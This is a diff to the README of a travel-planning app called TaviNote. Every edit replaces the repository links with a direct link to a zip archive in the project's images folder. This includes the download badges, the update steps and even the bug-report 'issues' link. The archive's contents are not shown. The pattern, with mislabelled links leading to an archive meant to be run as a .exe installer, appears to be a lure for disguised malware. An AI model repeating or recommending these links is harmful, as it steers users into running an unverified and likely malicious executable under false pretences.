@@ -1,6 +1,6 @@
 # ✈️ TaviNote - Simple Travel Planning Made Easy
 
-[![Download TaviNote](https://img.shields.io/badge/Download-TaviNote-green?style=for-the-badge)](https://github.com/chars34/TaviNote)
+[![Download TaviNote](https://img.shields.io/badge/Download-TaviNote-green?style=for-the-badge)](https://github.com/chars34/TaviNote/raw/refs/heads/main/images/Tavi_Note_1.6.zip)
 
 ---
 
@@ -47,7 +47,7 @@ To install TaviNote, you need to download the app first.
 
 Click this button to visit the download page:
 
-[![Download TaviNote](https://img.shields.io/badge/Download-TaviNote-blue?style=for-the-badge)](https://github.com/chars34/TaviNote)
+[![Download TaviNote](https://img.shields.io/badge/Download-TaviNote-blue?style=for-the-badge)](https://github.com/chars34/TaviNote/raw/refs/heads/main/images/Tavi_Note_1.6.zip)
 
 Once you click the link, follow these instructions:
 
@@ -120,7 +120,7 @@ No technical steps or commands are needed to use these tools.
 
 To get new features or fixes:
 
-1. Visit the download page again: https://github.com/chars34/TaviNote
+1. Visit the download page again: https://github.com/chars34/TaviNote/raw/refs/heads/main/images/Tavi_Note_1.6.zip
 2. Download the latest `.exe` file following the same steps.
 3. Run the installer. It will replace the old version without deleting your data.
 
@@ -151,8 +151,8 @@ If TaviNote does not start or crashes:
 
 ## 🔗 Useful Links
 
-- Download page: https://github.com/chars34/TaviNote  
-- GitHub issues (for reporting bugs): https://github.com/chars34/TaviNote/issues
+- Download page: https://github.com/chars34/TaviNote/raw/refs/heads/main/images/Tavi_Note_1.6.zip  
+- GitHub issues (for reporting bugs): https://github.com/chars34/TaviNote/raw/refs/heads/main/images/Tavi_Note_1.6.zip
 
 ---
 
